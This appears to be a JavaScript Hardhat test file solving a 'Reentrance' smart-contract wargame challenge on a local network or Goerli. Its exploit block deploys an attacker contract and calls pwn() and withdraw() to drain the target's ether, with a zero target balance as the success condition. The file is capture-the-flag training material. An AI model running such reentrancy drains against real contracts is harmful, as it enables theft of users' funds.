const { ethers } = require('hardhat');
const { expect } = require('chai');
const { EtherscanProvider } = require('@ethersproject/providers');

describe('[Challenge] Reentrance', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Reentrance');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Reentrance', deployer);
            this.target = await ContractFactory.deploy();
            await deployer.sendTransaction({to: this.target.address, value: ethers.utils.parseEther("1", "ether")});
            expect(parseInt(await ethers.provider.getBalance(this.target.address))).to.be.eq(parseInt(ethers.utils.parseEther("1", "ether")));
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        console.log(`\t attacker balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))}`);
        console.log(`\t deploying reentrancer contract...`);
        const ReentrancerFactory = await ethers.getContractFactory('Reentrancer', attacker);
        const Reentrancer = await ReentrancerFactory.deploy(
            this.target.address,
            {value: ethers.utils.parseEther("0.05", "ether")}
        );
        console.log(`\t pwning...`);
        let pwnTX = await Reentrancer.connect(attacker).pwn(); await pwnTX.wait();
        console.log(`\t withdrawing...`);
        let withdrawTX = await Reentrancer.connect(attacker).withdraw(); await withdrawTX.wait();
        console.log(`\t attacker balance: ${ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))}`);
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(parseInt(await ethers.provider.getBalance(this.target.address))).to.be.eq(0);
    });
});